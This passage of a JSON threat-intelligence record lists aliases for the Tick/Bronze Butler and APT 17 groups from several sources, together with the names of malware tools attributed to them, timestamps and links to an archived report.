            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "86fd71d3-06dc-4b73-b038-cedea7b83bac",
            "created_at": "2022-10-25T16:07:23.330793Z",
            "updated_at": "2025-03-27T02:02:09.740703Z",
            "deleted_at": null,
            "main_name": "APT 17",
            "aliases": [
                "APT 17",
                "ATK 2",
                "Beijing Group",
                "Bronze Keystone",
                "Deputy Dog",
                "Elderwood",
                "Elderwood Gang",
                "Operation Aurora",
                "Operation DeputyDog",
                "Operation Ephemeral Hydra",
                "Operation RAT Cook",
                "SIG22",
                "Sneaky Panda",
                "TEMP.Avengers",
                "TG-8153",
                "Tailgater Team"
            ],
            "source_name": "ETDA:APT 17",
            "tools": [
                "9002 RAT",
                "AGENT.ABQMR",
                "AGENT.AQUP.DROPPER",
                "AGENT.BMZA",
                "AGENT.GUNZ",
                "Agent.dhwf",
                "AngryRebel",
                "BlackCoffee",
                "Briba",
                "Chymine",
                "Comfoo",
                "Comfoo RAT",
                "Darkmoon",
                "DeputyDog",
                "Destroy RAT",
                "DestroyRAT",
                "Farfli",
                "Fexel",
                "Gen:Trojan.Heur.PT",
                "Gh0st RAT",
                "Ghost RAT",
                "Gresim",
                "HOMEUNIX",
                "HiKit",
                "HidraQ",
                "Homux",
                "Hydraq",
                "Jumpall",
                "Kaba",
                "Korplug",
                "Linfo",
                "MCRAT.A",
                "McRAT",
                "MdmBot",
                "Mdmbot.E",
                "Moudour",
                "Mydoor",
                "Naid",
                "Nerex",
                "PCRat",
                "PNGRAT",
                "Pasam",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "Roarur",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Trojan.Naid",
                "Vasport",
                "Wiarp",
                "Xamtrav",
                "Zox",
                "ZoxPNG",
                "ZoxRPC",
                "gresim",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716502,
    "ts_updated_at": 1743041809,
    "ts_creation_date": 1268404646,
    "ts_modification_date": 1268404646,
    "files": {
        "pdf": "https://archive.orkl.eu/6eb3094ecab54a8b80932f4bec263696f849ca77.pdf",
        "text": "https://archive.orkl.eu/6eb3094ecab54a8b80932f4bec263696f849ca77.txt",
        "img": "https://archive.orkl.eu/6eb3094ecab54a8b80932f4bec263696f849ca77.jpg"
    }
}